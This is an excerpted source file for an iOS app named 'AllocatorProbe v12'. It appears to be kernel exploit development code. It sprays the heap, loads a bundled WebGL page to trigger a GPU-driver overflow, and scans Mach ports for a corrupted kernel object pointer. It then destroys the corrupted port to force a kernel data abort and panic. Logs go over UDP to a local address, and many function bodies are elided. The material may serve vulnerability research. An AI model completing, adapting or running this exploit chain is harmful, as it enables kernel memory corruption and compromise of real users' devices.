/*
 * AllocatorProbe v12 — Kernel Deref Trigger
 * ==========================================
 * Changes from v11:
 *   - REMOVED trigger_commpage() — userspace write disqualified v11
 *   - DETECTION CHANGED: kobject==COMMPAGE_TARGET (ip_kobject written) vs kotype>100
 *   - TRIGGER CHANGED: mach_port_destroy() → kernel → ipc_kobject_destroy
 *     → task_deallocate(ip_kobject) → x0=COMMPAGE_TARGET → kernel data abort → panic IPS
 *   - DIAGNOSTIC: kotype>100 logged (foreign writer), no crash
 *   - DIAGNOSTIC: kobject==COMMPAGE_TARGET + wrong kotype logged, no crash
 *   - REFERENCES: agxfire_v12.html (single round, no secondary overflow)
 *   - UDP reporting to 192.168.68.108:9998
 *
...
static void udp_report(const char *msg) {
    ...
    inet_aton("192.168.68.108", &addr.sin_addr);
...
static void scan(void) {
    ...
    for (int i = 0; i < g_port_count && !g_found; i++) {
        ...
        if (kobject == COMMPAGE_TARGET) {
            if (kotype == 2) {
                /* ip_kobject=COMMPAGE_TARGET + io_bits→IKOT_TASK (kotype=2):
                 * mach_port_destroy → ipc_port_dealloc → ipc_kobject_destroy
                 * → task_deallocate((task_t)ip_kobject) → kernel loads x0=COMMPAGE_TARGET
                 * → kernel data abort at x0+offset → kernel panic → qualifying IPS */
                g_found = 1;
                ...
                /* ip_kobject written but io_bits wrong kotype — foreign writer hit io_bits */
                ev("KOBJECT_HIT_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx need=2",
                   i, kotype, (unsigned long long)kobject);
            }
        } else if (kotype > 100) {
            /* io_bits=0xFFFFFFFF from foreign writer — log for diagnostics, no crash */
            ev("KOTYPE_FOREIGN port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }

    /* ICMPv6 canaries (kalloc.168 = in6pcb zone, secondary diagnostic) */
...
- (BOOL)application:(UIApplication *)app
    ...
    ev("V12_LAUNCH AllocatorProbe v12 kobject-deref trigger");
    ...
    /* 100ms scan interval — reduces overhead vs v11 50ms */
    [NSTimer scheduledTimerWithTimeInterval:0.10
                                     target:self
                                   selector:@selector(scanTick:)
                                   userInfo:nil repeats:YES];

    /* Fire overflow after 3s — spray settled */
...
- (void)scanTick:(NSTimer *)t {
    ...
    if (!g_found) scan();
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d socks=%d ports=%d",
           tick, g_found, g_sock_count, g_port_count);
}

- (void)fireWebGL:(NSTimer *)t {
    ev("FIRE loading agxfire_v12.html in WKWebView");
    ...
    NSURL *url = [[NSBundle mainBundle] URLForResource:@"agxfire_v12" withExtension:@"html"];
    if (url) {
        [self.webView loadFileURL:url
          allowingReadAccessToURL:url.URLByDeletingLastPathComponent];
    } else {
        ev("ERROR agxfire_v12.html missing from bundle");
    }
}
